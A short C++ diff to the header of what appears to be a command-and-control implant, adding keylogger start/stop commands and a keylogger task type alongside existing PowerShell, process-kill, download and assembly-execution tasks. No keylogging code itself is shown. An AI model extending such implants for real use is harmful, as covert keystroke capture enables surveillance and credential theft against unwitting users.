@@ -16,7 +16,8 @@
 #define RUN_U 				6
 #define KILL_PROCESS		7
 #define DOWNLOAD_CHUNK 		8
-#define CANCEL_DOWNLOAD 	9
+#define START_KEYLOGGER		9
+#define STOP_KEYLOGGER		10
 
 // Task Types 
 #define NOP					0
@@ -33,6 +34,7 @@
 #define OBJECT_FILE			11
 #define GET_UID				12
 #define WIN_TASK			13
+#define KEYLOGGER 			14
 
 //  Statuses 
 #define NO_FLAG 			0
@@ -167,7 +169,7 @@ struct TaskError
 	}
 };
 
-using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<CommandWinTask>, TaskRequest<CommandNetAsm>, TaskRequest<bool>>;
+using Request = std::variant<TaskRequest<CommandPowershell>, TaskRequest<CommandWinTask>, TaskRequest<CommandNetAsm>, TaskRequest<CommandKeylogger>, TaskRequest<bool>>;
 using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
 
 inline std::string CreateResponseTaskValue(const std::deque<Response>& tasks) {
